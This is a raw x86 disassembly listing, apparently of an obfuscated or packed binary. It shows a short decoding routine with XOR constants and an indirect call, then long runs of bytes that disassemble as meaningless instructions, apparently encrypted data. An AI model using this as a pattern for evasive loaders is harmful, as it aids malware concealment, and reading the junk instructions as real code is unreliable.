  40f042:	mov    eax,DWORD PTR [ebp+0x10]
  40f045:	mov    eax,DWORD PTR [eax+0x198]
  40f04b:	push   DWORD PTR [eax]
  40f04d:	call   0x411333
  40f052:	mov    ecx,DWORD PTR [ebp-0x3c]
  40f055:	xor    ecx,esi
  40f057:	mov    eax,0xffcd8d67
  40f05c:	sub    eax,ecx
  40f05e:	sub    eax,DWORD PTR [ebp-0x8]
  40f061:	mov    ecx,DWORD PTR [ebp-0x50]
  40f064:	add    ecx,eax
  40f066:	mov    eax,DWORD PTR [ebp-0x8]
  40f069:	mov    DWORD PTR [eax+0x1],ecx
  40f06c:	mov    al,BYTE PTR [ebp-0x25]
  40f06f:	mov    ecx,DWORD PTR [ebp-0x8]
  40f072:	xor    al,0x44
  40f074:	sub    al,0x3a
  40f076:	mov    BYTE PTR [ecx],al
  40f078:	lea    eax,[ebp-0x8]
  40f07b:	inc    BYTE PTR [eax]
  40f07d:	inc    eax
  40f07e:	push   eax
  40f07f:	pop    ecx
  40f080:	dec    ecx
  40f081:	xchg   ecx,edx
  40f083:	dec    BYTE PTR [edx]
  40f085:	push   DWORD PTR [ebp+0x10]
  40f088:	mov    eax,ds:0x414bba
  40f08d:	mov    eax,DWORD PTR [eax]
  40f08f:	push   DWORD PTR [eax]
  40f091:	lea    eax,ds:0x414bd6
  40f097:	push   DWORD PTR [eax]
  40f099:	lea    eax,ds:0x414982
  40f09f:	push   DWORD PTR [eax]
  40f0a1:	lea    eax,ds:0x414bb6
  40f0a7:	push   DWORD PTR [eax]
  40f0a9:	lea    eax,ds:0x414cda
  40f0af:	push   DWORD PTR [eax]
  40f0b1:	xchg   ebx,edx
  40f0b3:	inc    ebx
  40f0b4:	push   ebx
  40f0b5:	pop    eax
  40f0b6:	call   DWORD PTR [eax-0x1]
  40f0b9:	lea    eax,[ebp+0x4]
  40f0bc:	mov    DWORD PTR [ebp-0x58],eax
  40f0bf:	mov    eax,ds:0x414afe
  40f0c4:	push   0x4
  40f0c6:	add    eax,0x1cc
  40f0cb:	push   eax
  40f0cc:	lea    eax,[ebp-0x1c]
  40f0cf:	push   eax
  40f0d0:	call   0x4028d7
  40f0d5:	mov    eax,DWORD PTR [ebp-0x1c]
  40f0d8:	mov    eax,DWORD PTR [ebp-0x4]
  40f0db:	mov    eax,DWORD PTR [ebp-0x24]
  40f0de:	mov    DWORD PTR [ebp+0xc],eax
  40f0e1:	mov    eax,ds:0x414b82
  40f0e6:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0e9:	sub    eax,edi
  40f0eb:	xor    eax,esi
  40f0ed:	cmp    eax,ecx
  40f0ef:	je     0x40f136
  40f0f5:	mov    eax,ds:0x414b7a
  40f0fa:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0fd:	sub    eax,edi
  40f0ff:	xor    eax,esi
  40f101:	cmp    eax,ecx
  40f103:	jne    0x40f119
  40f109:	mov    eax,ds:0x414b82
  40f10e:	add    eax,DWORD PTR ds:0x414b7a
  40f114:	jmp    0x40f120
  40f119:	mov    eax,DWORD PTR [ebp+0xc]
  40f11c:	xor    eax,esi
  40f11e:	add    eax,edi
  40f120:	mov    ds:0x414b7a,eax
  40f125:	mov    eax,DWORD PTR [ebp+0xc]
  40f128:	xor    eax,esi
  40f12a:	add    eax,edi
  40f12c:	mov    ds:0x414b82,eax
  40f131:	jmp    0x40f140
  40f136:	mov    eax,ds:0x414b82
  40f13b:	mov    ds:0x414b7a,eax
  40f140:	mov    eax,DWORD PTR [ebp-0x58]
  40f143:	mov    ecx,DWORD PTR ds:0x414b7a
  40f149:	add    DWORD PTR [eax],ecx
  40f14b:	mov    eax,DWORD PTR [ebp-0x1c]
  40f14e:	mov    eax,DWORD PTR [eax]
  40f150:	pop    edi
  40f151:	pop    esi
  40f152:	pop    ebx
  40f153:	leave  
  40f154:	ret    0xc
  40f157:	push   ebp
  40f158:	mov    ebp,esp
  40f15a:	jmp    0x40f4ed
  40f15f:	repz call 0x655e557a
  40f165:	jae    0x40f1d8
  40f167:	hlt    
  40f168:	aaa    
  40f169:	scas   eax,DWORD PTR es:[edi]
  40f16a:	aad    0xd5
  40f16c:	sbb    ecx,DWORD PTR [edx-0x25]
  40f16f:	and    BYTE PTR [esi+0x79f47e7e],dh
  40f175:	jle    0x40f1f5
  40f177:	xor    eax,DWORD PTR es:[edi]
  40f17a:	test   eax,0x3f77cea7
  40f17f:	push   edx
  40f180:	xchg   ah,al
  40f182:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f183:	bound  ebx,QWORD PTR [eax+0x7f628cda]
  40f189:	jb     0x40f13a
  40f18b:	add    esp,esp
  40f18d:	xchg   ecx,eax
  40f18e:	sub    eax,0x5e231df6
  40f193:	cmp    al,0x27
  40f195:	or     al,0xec
  40f197:	pop    esi
  40f198:	jne    0x40f1b5
  40f19a:	xchg   DWORD PTR [ecx-0x1dc1cb31],esi
  40f1a0:	jmp    0xec81001e
  40f1a5:	push   cs
  40f1a6:	mov    esp,0x1ce7cdd3
  40f1ab:	test   BYTE PTR [edx-0x64],dh
  40f1ae:	nop
  40f1af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1b0:	inc    edi
  40f1b1:	and    al,0x8f
  40f1b3:	push   DWORD PTR [ebp-0x53]
  40f1b6:	(bad)  
  40f1b7:	out    0x9a,eax
  40f1b9:	inc    edx
  40f1ba:	aaa    
  40f1bb:	clc    
  40f1bc:	jg     0x40f16f
  40f1be:	fld    QWORD PTR [eax]
  40f1c0:	mov    edi,ds
  40f1c2:	mov    edi,0x20adcd95
  40f1c7:	cmp    BYTE PTR [esi+0x7eb6d48e],ch
  40f1cd:	shl    DWORD PTR ds:0xc2a0943c,0xb4
  40f1d4:	test   DWORD PTR [ecx+0x59acd578],eax
  40f1da:	mov    ?,WORD PTR [eax-0x35]
  40f1dd:	xor    dl,dl
  40f1df:	stc    
  40f1e0:	dec    edx
  40f1e1:	and    eax,0xffcdb520
  40f1e6:	mov    cl,0x5c
  40f1e8:	push   edi
  40f1e9:	aad    0xdb
  40f1eb:	sti    
  40f1ec:	or     eax,0xf042efaf
  40f1f1:	pusha  
  40f1f2:	hlt    
  40f1f3:	shr    eax,0xcb
  40f1f6:	sub    eax,0xd26b71bf
  40f1fb:	push   ebp
  40f1fc:	test   BYTE PTR [ebx-0x6],dl
  40f1ff:	mov    bh,0xe
  40f201:	lods   al,BYTE PTR ds:[esi]
  40f202:	in     al,0x46
  40f204:	adc    DWORD PTR [esi-0x4f],edx
  40f207:	stos   DWORD PTR es:[edi],eax
  40f208:	rcl    DWORD PTR [eax-0x252bd30c],1
  40f20e:	es mov esp,0x98577cbe
  40f214:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f215:	lock push cs
  40f217:	ins    DWORD PTR es:[edi],dx
  40f218:	out    dx,al
  40f219:	cld    
  40f21a:	sbb    DWORD PTR [eax],ebx
  40f21c:	adc    DWORD PTR [ebp-0x6d],0xfa425a8b
  40f223:	icebp  
  40f224:	xor    cl,BYTE PTR [ebx-0x37f71c62]
  40f22a:	dec    ecx
  40f22b:	fs push eax
  40f22d:	xchg   BYTE PTR [esi],cl
  40f22f:	mov    cs,WORD PTR [edi+0x56]
  40f232:	scas   al,BYTE PTR es:[edi]
  40f233:	aam    0x66
  40f235:	scas   al,BYTE PTR es:[edi]
  40f236:	add    eax,DWORD PTR [esi+edx*1]
  40f239:	aas    
  40f23a:	call   0x82c17bde
  40f23f:	add    DWORD PTR [ecx+0xc],esi
  40f242:	jb     0x40f221
  40f244:	pop    ebp
  40f245:	cmp    ecx,DWORD PTR [ecx-0x2e1a0fae]
  40f24b:	push   edi
  40f24c:	ins    BYTE PTR es:[edi],dx
  40f24d:	inc    esi
  40f24e:	int3   
  40f24f:	push   esp
  40f250:	inc    ecx
  40f251:	or     DWORD PTR [ecx-0x585b7249],edi
  40f257:	fild   DWORD PTR [ebp-0x5e]
  40f25a:	lds    ebx,FWORD PTR [eax]
  40f25c:	cmp    ah,BYTE PTR [ebx]
  40f25e:	xchg   DWORD PTR [eax+ecx*1],ecx
  40f261:	loope  0x40f1eb
  40f263:	pop    ss
  40f264:	mov    esi,0xf54c870b
  40f269:	or     al,0x9a
  40f26b:	leave  
  40f26c:	fucomi st,st(0)
  40f26e:	lods   eax,DWORD PTR ds:[esi]
  40f26f:	mov    WORD PTR [edi+0x68],ds
  40f272:	mov    al,0xf0
  40f274:	inc    ebx
  40f275:	xor    eax,0xddbd9569
  40f27a:	lods   al,BYTE PTR ds:[esi]
  40f27b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f27c:	xor    al,BYTE PTR [ebx+0x3]
  40f27f:	(bad)  
  40f280:	mov    edi,0xdc198759
  40f285:	in     al,dx
  40f286:	cmp    ecx,0x13457135
  40f28c:	daa    
  40f28d:	fstp   DWORD PTR [ebp+0x46]
  40f290:	shr    DWORD PTR [esi+edx*4-0x3f],1
  40f294:	aas    
  40f295:	popf   
  40f296:	fneni(8087 only) 
  40f298:	(bad)  
  40f299:	pop    ds
  40f29a:	sar    BYTE PTR [edi-0x667ee303],cl
  40f2a0:	call   0x9f739732
  40f2a5:	js     0x40f249
  40f2a7:	jp     0x40f25d
  40f2a9:	cmp    DWORD PTR [edx],ecx
  40f2ab:	adc    eax,0x641db095
  40f2b0:	rcr    BYTE PTR [ecx-0x55ca74f],1
  40f2b6:	xchg   ebp,eax
  40f2b7:	jecxz  0x40f314
  40f2b9:	ins    DWORD PTR es:[edi],dx
  40f2ba:	jmp    0x40f250
  40f2bc:	inc    esi
  40f2bd:	dec    esp
  40f2be:	lods   eax,DWORD PTR ds:[esi]
  40f2bf:	rol    BYTE PTR [ebp+0x2d],1
  40f2c2:	push   esp
  40f2c3:	aas    
  40f2c4:	push   es
  40f2c5:	hlt    
  40f2c6:	(bad)  
  40f2c7:	out    0x53,al
  40f2c9:	jno    0x40f2a5
  40f2cb:	jge    0x40f268
  40f2cd:	stc    
  40f2ce:	xchg   esi,eax
  40f2cf:	in     al,dx
  40f2d0:	sbb    BYTE PTR [ebx+0xa],al
  40f2d3:	jge    0x40f2cc
  40f2d5:	outs   dx,BYTE PTR ds:[esi]
  40f2d6:	scas   al,BYTE PTR es:[edi]
  40f2d7:	fiadd  DWORD PTR [edx-0x45]
  40f2da:	data16 not BYTE PTR [ebx-0x6d449ff0]
  40f2e1:	add    cl,ch
  40f2e3:	jno    0x40f341
  40f2e5:	lods   al,BYTE PTR ds:[esi]
  40f2e6:	mov    ah,dl
  40f2e8:	mov    ecx,0x43592aac
  40f2ed:	call   FWORD PTR [esi]
  40f2ef:	daa    
  40f2f0:	add    BYTE PTR [edx-0x6d8a0bca],al
  40f2f6:	mov    ecx,esi
  40f2f8:	add    al,0xbb
  40f2fa:	cmp    eax,0x6ae953f4
  40f2ff:	or     BYTE PTR [esi-0x38],ch
  40f302:	mov    ecx,0x7513a2ee
  40f307:	xlat   BYTE PTR ds:[ebx]
  40f308:	les    eax,FWORD PTR [eax+0x25001707]
  40f30e:	xchg   edx,eax
  40f30f:	int    0x67
  40f311:	pop    ecx
  40f312:	(bad)  
  40f313:	cld    
  40f314:	loopne 0x40f2ce
  40f316:	mov    edi,0xd478c7e
  40f31b:	cmp    si,cx
  40f31e:	adc    al,BYTE PTR [ebp-0x1f6eb25f]
  40f324:	(bad)  
  40f325:	sub    edi,ecx
  40f327:	sub    al,0x4
  40f329:	scas   al,BYTE PTR es:[edi]
  40f32a:	in     al,dx
  40f32b:	repnz mov esi,0xd7e7d7e3
  40f331:	clc    
  40f332:	test   DWORD PTR [esi-0x6c],ecx
  40f335:	mov    cl,0x34
  40f337:	out    dx,al
  40f338:	xchg   edi,eax
  40f339:	add    ebp,DWORD PTR [esi+0x2c]
  40f33c:	je     0x40f2de
  40f33e:	int3   
  40f33f:	lea    ebp,[edx+0x4c]
  40f342:	xor    bh,BYTE PTR [edx]
  40f344:	test   al,0x87
  40f346:	dec    ecx
  40f347:	cmp    dl,ah
  40f349:	pop    edi
  40f34a:	add    bh,dh
  40f34c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f34d:	add    esp,0x2e039108
  40f353:	pop    eax
  40f354:	dec    edi
  40f355:	push   0xa798b2de
  40f35a:	mov    ah,0xf3
  40f35c:	leave  
  40f35d:	xchg   dh,bh
  40f35f:	mov    dh,0x50
  40f361:	sahf   
  40f362:	test   BYTE PTR [ebx+eax*4-0x7e],0x3b
  40f367:	jb     0x40f358
  40f369:	add    al,0xec
  40f36b:	push   eax
  40f36c:	mov    bh,0xae
  40f36e:	(bad)  
  40f36f:	add    BYTE PTR [esi+0x5e],dl
  40f372:	add    BYTE PTR [ecx-0x6],al
  40f375:	stos   BYTE PTR es:[edi],al
  40f376:	sahf   
  40f377:	stos   DWORD PTR es:[edi],eax
  40f378:	mov    esp,edx
  40f37a:	lahf   
  40f37b:	dec    eax
  40f37c:	mov    eax,0x4945ed8a
  40f381:	or     DWORD PTR [ecx+0xa],ebp
  40f384:	cmp    ecx,DWORD PTR [esi]
  40f386:	ret    0x9f0d
  40f389:	nop
  40f38a:	ja     0x40f39a
  40f38c:	jge    0x40f32e
  40f38e:	rcl    ch,1
  40f390:	rcr    BYTE PTR [ebp+ecx*4-0x114efddc],1
  40f397:	push   esi
  40f398:	dec    ecx
  40f399:	mov    ebp,fs
  40f39b:	(bad)  
  40f39c:	in     al,dx
  40f39d:	inc    ebx
  40f39e:	cdq    
  40f39f:	dec    ecx
  40f3a0:	mov    dh,0x28
  40f3a2:	adc    ecx,esp
  40f3a4:	popf   
  40f3a5:	push   ebp
  40f3a6:	aad    0x44
  40f3a8:	cmc    
  40f3a9:	xchg   ebx,eax
  40f3aa:	jo     0x40f34b
  40f3ac:	popf   
  40f3ad:	sub    BYTE PTR [eiz*1+0x2ba5fcee],0xfc
  40f3b5:	shr    BYTE PTR [esi-0x60],0x13
  40f3b9:	ret    0xaa71
  40f3bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3bd:	jbe    0x40f34f
  40f3bf:	dec    esi
  40f3c0:	mov    dh,0xd4
  40f3c2:	add    BYTE PTR [eax+0x20],0xfd
  40f3c6:	adc    BYTE PTR [edx],al
  40f3c8:	mov    bh,0x52
  40f3ca:	sbb    BYTE PTR [ecx+0x36292d1e],ch
  40f3d0:	dec    ecx
  40f3d1:	call   0x6ac0:0xf916f25d
  40f3d8:	stos   BYTE PTR es:[edi],al
  40f3d9:	mov    ah,0xeb
  40f3db:	add    ebx,DWORD PTR [edi-0x40359bf3]
  40f3e1:	into   
  40f3e2:	mov    ebx,?
  40f3e4:	sub    DWORD PTR [ecx+0x768f7f6e],ebx
  40f3ea:	cmp    BYTE PTR [ebx],dh
  40f3ec:	sbb    ch,BYTE PTR [esi]
  40f3ee:	ja     0x40f387
  40f3f0:	fisttp WORD PTR [eax+0x793a83af]
  40f3f6:	(bad)
  40f3fb:	pop    eax
  40f3fc:	push   ecx
  40f3fd:	shl    DWORD PTR [edi-0x3e],cl
  40f400:	jne    0x40f451
  40f402:	outs   dx,BYTE PTR ds:[esi]
  40f403:	mov    edx,0x70177813
  40f408:	ss xor al,0x93
  40f40b:	xchg   DWORD PTR [ebp+0x93d31bc],edi
  40f411:	outs   dx,BYTE PTR ds:[esi]
  40f412:	shr    BYTE PTR [eax+0x66c83377],cl
  40f418:	out    dx,eax
  40f419:	arpl   WORD PTR [esi+ecx*4+0x4709b777],bp
  40f420:	pop    ss
  40f421:	ja     0x40f413
  40f423:	mov    dh,0xaf
  40f425:	call   0x5fe52a0b
  40f42a:	sub    dl,BYTE PTR [edi-0x624652b3]
  40f430:	clc    
  40f431:	rcl    DWORD PTR [ecx],1
  40f433:	mov    dh,0xbe
  40f435:	in     eax,dx
  40f436:	(bad)  
  40f437:	cmp    edx,ebp
  40f439:	mov    ds:0x2da88514,eax
  40f43e:	mov    al,0xee
  40f440:	scas   eax,DWORD PTR es:[edi]
  40f441:	add    dl,BYTE PTR [ebp+eiz*8-0x1de534a7]
  40f448:	and    cl,cl
  40f44a:	jp     0x40f436
  40f44c:	lahf   
  40f44d:	js     0x40f41e
  40f44f:	call   0xa0da:0x3d0ce289
  40f456:	pop    eax
  40f457:	pop    ecx
  40f458:	ds jbe 0x40f466
  40f45b:	xlat   BYTE PTR ss:[ebx]
  40f45d:	cmp    dh,BYTE PTR [edx+0x75]
  40f460:	sbb    eax,0x1cc2a5e8
  40f465:	sbb    al,BYTE PTR [ebx-0x5372c33f]
  40f46b:	adc    ebp,ecx
  40f46d:	jge    0x40f4ae
  40f46f:	jno    0x40f406
  40f471:	shl    DWORD PTR [ebx-0x74e40b04],0xd9
  40f478:	xchg   ebx,eax
  40f479:	aam    0x86
  40f47b:	int    0xfb
  40f47d:	add    DWORD PTR ds:[ebx+0x18],eax
  40f481:	addr16 sub al,0xf7
  40f484:	ins    BYTE PTR es:[edi],dx
  40f485:	inc    edi
  40f486:	sbb    BYTE PTR [esi],dl
  40f488:	inc    ebx
  40f489:	or     al,0x73
  40f48b:	jmp    0x40f4a7
  40f48d:	xchg   edx,eax
  40f48e:	jb     0x40f438
  40f490:	dec    esp
  40f491:	lahf   
  40f492:	xchg   edx,eax
  40f493:	mov    fs,WORD PTR [esi+0x21263196]
  40f499:	call   0xc8054afe
  40f49e:	jl     0x40f425
  40f4a0:	jmp    0xa37aec73
  40f4a5:	bsf    esp,esi
  40f4a8:	sar    BYTE PTR [edi-0x6],0x4
  40f4ac:	nop
  40f4ad:	sub    eax,0xc3eb7c6d
  40f4b2:	inc    esp
  40f4b3:	mov    al,0xfc
  40f4b5:	pop    es
  40f4b6:	bound  edi,QWORD PTR [eax+ecx*2+0x55d8b5cd]
  40f4bd:	loop   0x40f4ce
  40f4bf:	xchg   ebp,eax
  40f4c0:	mov    ds:0xa1b18412,al
  40f4c5:	sbb    BYTE PTR [ecx-0x40b7fc1a],0x11
  40f4cc:	sti    
  40f4cd:	jnp    0x40f4b7
  40f4cf:	mov    edi,0x2ba5c02d
  40f4d4:	inc    eax
  40f4d5:	mov    ebp,0xbceb135a
  40f4da:	(bad)  
  40f4db:	mov    cl,0x10
  40f4dd:	mov    edx,0x43d9aef6
  40f4e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4e3:	mov    ecx,0x1f57429
  40f4e8:	outs   dx,BYTE PTR ds:[esi]
  40f4e9:	hlt    
  40f4ea:	nop
  40f4eb:	ds xchg ebp,eax
  40f4ed:	push   ecx
  40f4ee:	push   ecx
  40f4ef:	mov    eax,0xf89c8539
  40f4f4:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  40f4fb:	mov    DWORD PTR ds:0x43477b,0x36a0
  40f505:	push   esi
  40f506:	mov    ecx,DWORD PTR ds:0x43478b
  40f50c:	mov    DWORD PTR [ebp-0x8],eax
  40f50f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f512:	mov    DWORD PTR ds:0x434753,0x6a14
  40f51c:	push   edi
  40f51d:	mov    DWORD PTR ds:0x43477f,0x48b4
  40f527:	mov    edi,0x7510851
  40f52c:	mov    DWORD PTR ds:0x4346bf,0x7e06
  40f536:	mov    esi,0x327299
  40f53b:	mov    DWORD PTR ds:0x43470b,0x7203
  40f545:	cmp    ecx,eax
  40f547:	je     0x40fd56
  40f54d:	or     eax,eax
  40f54f:	jmp    0x40f8e2
  40f554:	cmc    
  40f555:	pop    esp
  40f556:	inc    ebp
  40f557:	gs ins DWORD PTR es:[edi],dx
  40f559:	jge    0x40f550
  40f55b:	pop    esp
  40f55c:	push   0xffffffac
  40f55e:	add    ah,BYTE PTR [esi+0x74]
  40f561:	ret    
  40f562:	mov    eax,ds:0x7eb19ef1
  40f567:	jle    0x40f55d
  40f569:	jns    0x40f5e9
  40f56b:	jle    0x40f54a
  40f56d:	mov    eax,ds:0x3cb2ad0e
  40f572:	repz or eax,0x5fc8592c
  40f578:	cdq    
  40f579:	xchg   BYTE PTR [eax-0x523da3c4],cl
  40f57f:	push   edx
  40f580:	mov    ah,al
  40f582:	push   ds
  40f583:	stos   BYTE PTR es:[edi],al
  40f584:	out    0xd7,eax
  40f586:	mov    BYTE PTR [esi+0x1bd72d3f],0xf5
  40f58d:	stc    
  40f58e:	mov    WORD PTR [ecx],?
  40f590:	jl     0x40f5e8
  40f592:	out    dx,al
  40f593:	jne    0x40f60e
  40f595:	enter  0x64f5,0x40
  40f599:	jns    0x40f60e
  40f59b:	test   al,0xf2
  40f59d:	pop    es
  40f59e:	fs dec esp
  40f5a0:	fwait
  40f5a1:	adc    BYTE PTR [ebp-0x48],bl
  40f5a4:	cmp    ecx,DWORD PTR [eax-0x6d]
  40f5a7:	xor    ah,BYTE PTR [eax+0x42d5cfd]
  40f5ad:	int3   
  40f5ae:	jl     0x40f5f3
  40f5b0:	add    esi,DWORD PTR [eax]
  40f5b2:	mov    DWORD PTR [esi+0x73e62736],edi
  40f5b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5b9:	push   esi
  40f5ba:	(bad)  
  40f5bb:	xor    eax,0x984124bf
  40f5c0:	jecxz  0x40f622
  40f5c2:	in     eax,dx
  40f5c3:	sub    BYTE PTR [edx],ch
  40f5c5:	push   ebp
  40f5c6:	pop    eax
  40f5c7:	add    al,0x4b
  40f5c9:	jno    0x40f5c9
  40f5cb:	mov    bl,0xba
  40f5cd:	leave  
  40f5ce:	(bad)  
  40f5d0:	add    BYTE PTR [ebx+0x3f],dh
  40f5d3:	pushf  
  40f5d4:	inc    eax
  40f5d5:	addr16 call 0xd4ab:0x53de675a
  40f5dd:	call   0xea908cdf
  40f5e2:	sub    DWORD PTR [esi+0x45908443],0x46
  40f5e9:	or     DWORD PTR ds:0xf1c0761,esp
  40f5ef:	xchg   esi,eax
  40f5f0:	mov    WORD PTR [ebx+0x51044d9d],es
  40f5f6:	inc    ecx
  40f5f7:	(bad)  [ebx+0x67fcb717]
  40f5fe:	mov    esp,0x9512068e
  40f603:	(bad)  
  40f604:	dec    esp
  40f605:	dec    edi
  40f606:	mov    dh,0xdb
  40f608:	popa   
  40f609:	or     BYTE PTR [edx],dh
  40f60b:	std    
  40f60c:	add    BYTE PTR [ecx-0x6e],bl
  40f60f:	pusha  
  40f610:	aaa    
  40f611:	mov    eax,ds:0xf9c7f024
  40f616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f617:	popf   
  40f618:	push   ecx
  40f619:	fbstp  TBYTE PTR [esi+ebp*8-0x5c6e879a]
  40f620:	lock loopne 0x40f645
  40f623:	inc    ebx
  40f624:	fs jb  0x40f69a
  40f627:	repz sbb al,0x64
  40f62a:	lock fnstsw WORD PTR [ebx+0x13]
  40f62e:	mov    eax,0xc5467f9f
  40f633:	jne    0x40f695
  40f635:	call   0xb6148e07
  40f63a:	mov    bl,0x6a
  40f63c:	mov    eax,ds:0xb2921b2c
  40f641:	(bad)  
  40f642:	push   0x824acfff
  40f647:	xchg   ecx,eax
  40f648:	mov    fs,WORD PTR [esp+edx*8]
  40f64b:	lock ds hlt 
  40f64e:	imul   edx,edi,0x1
  40f651:	dec    esp
  40f652:	and    BYTE PTR [ebx],bh
  40f654:	pop    ebp
  40f655:	je     0x40f69b
  40f657:	push   esp
  40f658:	call   0x959fab3e
  40f65d:	shr    ebp,cl
  40f65f:	xchg   esp,eax
  40f660:	int3   
  40f661:	add    ebp,ebp
  40f663:	push   ss
  40f664:	in     eax,dx
  40f665:	dec    edi
  40f666:	cwde   
  40f667:	dec    esi
  40f668:	xor    edi,DWORD PTR [edx-0x58]
  40f66b:	hlt    
  40f66c:	cmp    al,0xeb
  40f66e:	jb     0x40f668
  40f670:	cmp    al,0x34
  40f672:	xor    eax,0x1c367aad
  40f677:	and    cl,ch
  40f679:	(bad)  
  40f67b:	shl    BYTE PTR ds:0x7aff9734,1
  40f681:	xchg   esp,eax
  40f682:	adc    ebx,DWORD PTR [edi-0x49aa0c56]
  40f688:	loope  0x40f60e
  40f68a:	into   
  40f68b:	jae    0x40f6bd
  40f68d:	(bad)  
  40f68e:	stos   DWORD PTR es:[edi],eax
  40f68f:	xchg   edx,eax
  40f690:	dec    ecx
  40f691:	jnp    0x40f61a
  40f693:	mov    ecx,0xee40543c
  40f698:	sti    
  40f699:	(bad)  
  40f69a:	jmp    0x6d886062
  40f69f:	in     al,dx
  40f6a0:	mov    dl,0xb
  40f6a2:	jns    0x40f630
  40f6a4:	pusha  
  40f6a5:	shl    eax,1
  40f6a7:	or     eax,edi
  40f6a9:	jge    0x40f70c
  40f6ab:	das    
  40f6ac:	xor    al,0x79
  40f6ae:	pextrw esi,(bad),0xc5
  40f6b0:	xor    BYTE PTR [ebx+0x6b16a692],ch
  40f6b6:	ret    
  40f6b7:	adc    esp,DWORD PTR [eax]
  40f6b9:	mov    cl,0x7b
  40f6bb:	repz mov ebp,0x34be31c2
  40f6c1:	ficom  DWORD PTR [eax-0x35]
  40f6c4:	push   esi
  40f6c5:	pop    ds
  40f6c6:	adc    eax,0x2a723184
  40f6cb:	sbb    edi,ebx
  40f6cd:	cmp    dl,BYTE PTR [edi+esi*1+0x3114a757]
  40f6d4:	dec    edi
  40f6d5:	jmp    0x40f73c
  40f6d7:	imul   DWORD PTR [ecx+0x1eeccff6]
  40f6dd:	xchg   edi,eax
  40f6de:	inc    ecx
  40f6df:	add    eax,DWORD PTR [ebx]
  40f6e1:	fwait
  40f6e2:	cmp    edi,DWORD PTR [edx-0x3d9cd920]
  40f6e8:	fadd   DWORD PTR [eax-0x1a3ceb64]
  40f6ee:	sbb    ebx,DWORD PTR [edi]
  40f6f0:	ins    DWORD PTR es:[edi],dx
  40f6f1:	push   edi
  40f6f2:	sbb    dh,BYTE PTR [esi+eax*4]
  40f6f5:	sub    DWORD PTR [edx-0x33e7d302],edx
  40f6fb:	xchg   DWORD PTR [eax+eax*2+0x3043b2f7],esi
  40f702:	popa   
  40f703:	mov    ds:0x7691a12b,al
  40f708:	(bad)  
  40f709:	test   eax,0x932a6e1
  40f70e:	pop    ebp
  40f70f:	add    bh,bl
  40f711:	xchg   ebx,eax
  40f712:	sahf   
  40f713:	lahf   
  40f714:	or     eax,0x4c55482d
  40f719:	push   0xa91e996d
  40f71e:	(bad)  
  40f71f:	hlt    
  40f720:	test   bl,bh
  40f722:	adc    al,0x17
  40f724:	jo     0x40f79d
  40f726:	leave  
  40f727:	fwait
  40f728:	jnp    0x40f799
  40f72a:	pop    ds
  40f72b:	push   eax
  40f72c:	cmp    ah,BYTE PTR [edi+0x4a]
  40f72f:	dec    esp
  40f730:	jg     0x40f718
  40f732:	lock mov esi,0x1290b080
  40f738:	iret   
  40f739:	dec    edx
  40f73a:	(bad)  
  40f73b:	shr    DWORD PTR [eax+edi*4-0x31],cl
  40f73f:	push   ebx
  40f740:	cwde   
  40f741:	fld    TBYTE PTR [ebx+0x3d6f3b43]
  40f747:	xchg   edi,eax
  40f748:	sahf   
  40f749:	jnp    0x40f714
  40f74b:	mov    WORD PTR [ebp-0x16],ss
  40f74e:	mov    DWORD PTR [edx+0x38],ecx
  40f751:	xor    eax,0xa710b4a8
  40f756:	cmp    eax,0x6653f61a
  40f75b:	cs jae 0x40f761
  40f75e:	sub    eax,0xa9181f40
  40f763:	sbb    ebp,DWORD PTR [edi-0x37]
  40f766:	push   ds
  40f767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f768:	or     ecx,DWORD PTR [eax+0x3c]
  40f76b:	or     BYTE PTR [ebp+0x25],dl
  40f76e:	inc    esi
  40f76f:	data16 fucomp st(0)
  40f772:	call   0xa1cb:0x7e660f38
  40f779:	imul   esp,DWORD PTR [eax+eiz*8+0x4f71e0e2],0x1b6fff53
  40f784:	xor    al,BYTE PTR [ebp-0x2e]
  40f787:	neg    DWORD PTR [eax+0x14]
  40f78a:	mov    eax,DWORD PTR [edx+edi*1+0x6d725eda]
  40f791:	dec    edx
  40f792:	or     al,0xa1
  40f794:	push   ebp
  40f795:	adc    BYTE PTR [ebx-0x48],0xf
  40f799:	xchg   DWORD PTR [edi-0x5513a1],ebp
  40f79f:	in     eax,0x9d
  40f7a1:	fnstenv [ebp+0x42d85073]
  40f7a7:	loop   0x40f7d9
  40f7a9:	push   ecx
  40f7aa:	test   ch,bl
  40f7ac:	mov    ss,WORD PTR [esi-0x20]
  40f7af:	add    eax,0xc006c2bf
  40f7b4:	jmp    0xd2e5:0x2116d5dd
  40f7bb:	aas    
  40f7bc:	push   ecx
  40f7bd:	ins    BYTE PTR es:[edi],dx
  40f7be:	mov    ch,0xe9
  40f7c0:	out    dx,al
  40f7c1:	std    
  40f7c2:	iret   
  40f7c3:	add    DWORD PTR [eax],edi
  40f7c5:	cwde   
  40f7c6:	pop    eax
  40f7c7:	jecxz  0x40f77a
  40f7c9:	pusha  
  40f7ca:	in     al,0x49
  40f7cc:	xor    edi,DWORD PTR [edi+0x7cdb795]
  40f7d2:	dec    ecx
  40f7d3:	xchg   edx,eax
  40f7d4:	xlat   BYTE PTR ds:[ebx]
  40f7d5:	mov    al,dh
  40f7d7:	xchg   esi,eax
  40f7d8:	rcr    BYTE PTR [ebx],cl
  40f7da:	mov    dh,BYTE PTR [ecx+0x33]
  40f7dd:	adc    edx,DWORD PTR [eax]
  40f7df:	call   0x80e81a89
  40f7e4:	sbb    dh,BYTE PTR [edi-0x1]
  40f7e7:	test   BYTE PTR [ebx-0x4ce645c1],dh
  40f7ed:	icebp  
  40f7ee:	cwde   
  40f7ef:	out    0x10,eax
  40f7f1:	enter  0xc488,0xc
  40f7f5:	hlt    
  40f7f6:	cmp    dl,cl
  40f7f8:	dec    ebx
  40f7f9:	pop    ebp
